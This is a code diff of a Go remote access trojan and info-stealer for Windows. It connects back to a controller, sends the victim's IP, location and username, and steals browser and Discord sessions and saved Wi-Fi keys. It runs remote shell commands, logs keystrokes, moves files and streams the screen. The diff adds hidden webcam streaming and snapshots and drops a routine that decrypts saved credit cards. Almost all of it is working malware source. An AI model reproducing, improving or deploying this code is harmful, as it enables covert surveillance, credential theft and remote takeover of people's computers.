@@ -25,15 +25,15 @@ import (
 	"unsafe"
 
 	"github.com/atotto/clipboard"
-	"github.com/go-toast/toast"
 	"github.com/kbinani/screenshot"
-	"github.com/lxn/walk"
+	"github.com/go-toast/toast"
 	"github.com/moutend/go-hook/pkg/keyboard"
 	"github.com/moutend/go-hook/pkg/types"
 	"github.com/shirou/gopsutil/v4/cpu"
 	"github.com/shirou/gopsutil/v4/host"
 	"github.com/shirou/gopsutil/v4/mem"
 	"github.com/ulikunitz/xz"
+	"gocv.io/x/gocv"
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 	_ "modernc.org/sqlite"
@@ -118,6 +118,8 @@ var (
 	}
 
 	SESSIONS = [6]string{"Brave", "Chrome", "Edge", "Opera", "Opera GX", "Discord"}
+	INFO     = "NULL;NULL;NULL;NULL"
+	IPINFO   = ""
 )
 
 type Connection struct {
@@ -137,15 +139,23 @@ func getIp() string {
 func getLocation(ip string) {
 	resp, _ := http.Get(fmt.Sprintf("https://ipapi.co/%v/json/", ip))
 	json.NewDecoder(resp.Body).Decode(&System)
+	json.NewDecoder(resp.Body).Decode(&information)
+	IP, _ := json.MarshalIndent(information, "", " ")
+	IPINFO = string(IP)
+}
+
+func GetInfo() {
+	IPv4 := getIp()
+	getLocation(IPv4)
+	INFO = fmt.Sprintf("%v;%v;%v;%v", IPv4, System.Country, os.Getenv("USERNAME"), runtime.GOOS)
+
 }
 
 func connectToServer(ip string, port int) {
 	client, err := net.Dial("tcp", fmt.Sprintf("%v:%v", ip, port))
 	if err == nil {
 		System = Connection{"NULL", client, *bufio.NewReader(client), *bufio.NewWriter(client)}
-		IPv4 := getIp()
-		getLocation(IPv4)
-		writeResponse(fmt.Sprintf("%v;%v;%v;%v", IPv4, System.Country, os.Getenv("USERNAME"), runtime.GOOS))
+		writeResponse(INFO)
 		active = true
 	} else {
 		time.Sleep(time.Second * 5)
@@ -177,7 +187,7 @@ func run(command string) string {
 	return strings.TrimSpace(string(out))
 }
 
-func notify(appname string, title string, message string) {
+func notify(appname, title, message string) {
 	notification := toast.Notification{
 		AppID:   appname,
 		Title:   title,
@@ -185,13 +195,6 @@ func notify(appname string, title string, message string) {
 		Audio:   toast.Default,
 	}
 	notification.Push()
-}
-
-func ipInfo() {
-	resp, _ := http.Get(fmt.Sprintf("https://ipapi.co/%v/json/", getIp()))
-	json.NewDecoder(resp.Body).Decode(&information)
-	body, _ := json.MarshalIndent(information, "", " ")
-	DATA.WriteString(fmt.Sprintf("=============================[IP]==============================\n%v\n%v\n", string(body), run("ipconfig")))
 }
 
 func discordInfo() {
@@ -287,42 +290,26 @@ func browserInfo() {
 	}
 }
 
-func cardInfo() {
-	for index, path := range WEB_PATHS {
-		dbData, err := os.ReadFile(path)
-		if err != nil {
-			continue
-		}
-		os.WriteFile("vault.db", dbData, 0644)
-		defer os.Remove("vault.db")
-
-		db, _ := sql.Open("sqlite", "vault.db")
-		defer db.Close()
-
-		rows, _ := db.Query("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards;")
-		defer rows.Close()
-
-		for rows.Next() {
-			var name, number, expiration_m, expiration_y string
-			rows.Scan(&name, &number, &expiration_m, &expiration_y)
-			if strings.HasPrefix(number, "v10") {
-				number = decryptData([]byte(number[3:]), extractKey(LOCAL_PATHS[index]))
-				if number != "" {
-					DATA.WriteString(fmt.Sprintf("=========================[CREDIT-CARD]=========================\nBrowser: %v\nCard_Owner: %s\nCard_Number: %s\nExpiration_Month: %v\nExpiration_Year: %v\n\n", SESSIONS[index], name, number, expiration_m, expiration_y))
-				}
-			}
-		}
-	}
-}
-
 func wifiInfo() {
-	profiles := run("netsh wlan show profiles")
-	lines := strings.Split(profiles, "\n")
+	out := run("netsh wlan show profiles")
+	lines := strings.Split(out, "\n")
+
 	for _, line := range lines {
-		if strings.Contains(line, ":") {
+		if strings.Contains(line, "All User Profile") {
 			profile := strings.TrimSpace(strings.Split(line, ":")[1])
-			if len(profile) > 0 {
-				DATA.WriteString(fmt.Sprintf("==========================[WIFI]============================\n%v\n", run(fmt.Sprintf("netsh wlan show profile %v key=clear", profile))))
+
+			out = run(fmt.Sprintf("netsh wlan show profile name=%v key=clear", profile))
+			lines := strings.Split(out, "\n")
+
+			for _, line := range lines {
+				if strings.Contains(line, "Key Content") {
+					parts := strings.Split(line, ":")
+					if len(parts) < 2 {
+						continue
+					}
+					key := strings.TrimSpace(parts[1])
+					DATA.WriteString(fmt.Sprintf("==============================[WIFI]==============================\nProfile: %v\nKey: %s\n\n", profile, key))
+				}
 			}
 		}
 	}
@@ -354,11 +341,10 @@ func sysInfo() {
 
 func fetchData() {
 	sysInfo()
-	ipInfo()
-	discordInfo()
-	cardInfo()
-	browserInfo()
 	wifiInfo()
+	DATA.WriteString(IPINFO)
+	discordInfo()
+	browserInfo()
 
 	writeResponse("<START>")
 	writeResponse(DATA.String())
@@ -368,7 +354,30 @@ func fetchData() {
 
 func stream() {
 	for streaming {
-		img, _ := screenshot.CaptureDisplay(0)
+		img, err := screenshot.CaptureDisplay(0)
+		if err != nil {
+			writeResponse("<ERR>")
+			streaming = false
+		}
+		jpeg.Encode(System.conn, img, nil)
+		time.Sleep(time.Millisecond * 50)
+	}
+}
+
+func streamCam() {
+	camera, err := gocv.OpenVideoCapture(0)
+	if err != nil {
+		writeResponse("<ERR>")
+		streaming = false
+	}
+	defer camera.Close()
+
+	frame := gocv.NewMat()
+	defer frame.Close()
+
+	for streaming {
+		camera.Read(&frame)
+		img, _ := frame.ToImage()
 		jpeg.Encode(System.conn, img, nil)
 		time.Sleep(time.Millisecond * 50)
 	}
@@ -460,6 +469,7 @@ func decompress(data []byte) []byte {
 
 func main() {
 	persist()
+	GetInfo()
 	for {
 		if active {
 			command, err := System.reader.ReadString('\n')
@@ -472,7 +482,12 @@ func main() {
 				fetchData()
 
 			case "\x02":
-				method, _ := System.reader.ReadString('\n')
+				method, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+
 				method = strings.TrimSpace(method)
 				if method == "1" {
 					writeResponse("<SHARE>")
@@ -483,20 +498,40 @@ func main() {
 				}
 
 			case "\x03":
-				url, _ := System.reader.ReadString('\n')
+				url, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+
 				exec.Command("rundll32.exe", "url.dll,FileProtocolHandler", strings.TrimSpace(url)).Start()
 
 			case "\x04":
-				command, _ := System.reader.ReadString('\n')
+				command, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+
 				writeResponse("<START>")
 				writeResponse(run(command))
 				writeResponse("<END>")
 
 			case "\x05":
-				method, _ := System.reader.ReadString('\n')
+				method, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+
 				method = strings.TrimSpace(method)
 				if method == "1" {
-					content, _ := System.reader.ReadString('\n')
+					content, err := System.reader.ReadString('\n')
+					if err != nil {
+						System.conn.Close()
+						active = false
+					}
+
 					clipboard.WriteAll(content)
 				} else {
 					content, _ := clipboard.ReadAll()
@@ -506,14 +541,39 @@ func main() {
 				}
 
 			case "\x06":
-				title, _ := System.reader.ReadString('\n')
-				message, _ := System.reader.ReadString('\n')
-				go walk.MsgBox(nil, title, message, walk.MsgBoxIconError)
+				title, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+
+				message, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+
+				notification := fmt.Sprintf("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\"%v\", \"%v\", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)", message, title)
+				cmd := exec.Command("powershell.exe", "/c", notification)
+				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+				cmd.Start()
 
 			case "\x07":
-				appid, _ := System.reader.ReadString('\n')
-				title, _ := System.reader.ReadString('\n')
-				message, _ := System.reader.ReadString('\n')
+				appid, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+				title, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+				message, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
 				go notify(appid, title, message)
 
 			case "\x08":
@@ -521,8 +581,42 @@ func main() {
 				img, _ := screenshot.CaptureDisplay(0)
 				jpeg.Encode(System.conn, img, nil)
 
+			case "\x16":
+				method, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+
+				method = strings.TrimSpace(method)
+				if method == "1" {
+					writeResponse("<SHARE>")
+					streaming = true
+					go streamCam()
+				} else {
+					streaming = false
+				}
+
+			case "\x17":
+				writeResponse("<SCREEN>")
+				camera, err := gocv.OpenVideoCapture(0)
+				if err == nil {
+					defer camera.Close()
+					frame := gocv.NewMat()
+					defer frame.Close()
+					camera.Read(&frame)
+					img, _ := frame.ToImage()
+					jpeg.Encode(System.conn, img, nil)
+
+				}
+
 			case "":
-				method, _ := System.reader.ReadString('\n')
+				method, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+
 				method = strings.TrimSpace(method)
 				if method == "1" && !logging {
 					go listenKeystrokes(true)
@@ -544,7 +638,12 @@ func main() {
 				exec.Command("rundll32.exe", "user32.dll,LockWorkStation").Start()
 
 			case "\x13":
-				path, _ := System.reader.ReadString('\n')
+				path, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
+
 				data, err := os.ReadFile(strings.TrimSpace(path))
 				if err == nil {
 					writeResponse("<DOWNLOAD>")
@@ -554,10 +653,18 @@ func main() {
 
 			case "\x14":
 				var DATA strings.Builder
-				filename, _ := System.reader.ReadString('\n')
+				filename, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
 
 				for {
-					data, _ := System.reader.ReadString('\n')
+					data, err := System.reader.ReadString('\n')
+					if err != nil {
+						System.conn.Close()
+						active = false
+					}
 					if strings.TrimSpace(data) == "<END>" {
 						break
 					}
@@ -566,7 +673,11 @@ func main() {
 				os.WriteFile(strings.TrimSpace(filename), decompress([]byte(DATA.String())), 0644)
 
 			case "\x15":
-				path, _ := System.reader.ReadString('\n')
+				path, err := System.reader.ReadString('\n')
+				if err != nil {
+					System.conn.Close()
+					active = false
+				}
 				go getWallpaper(strings.TrimSpace(path))
 			}
 
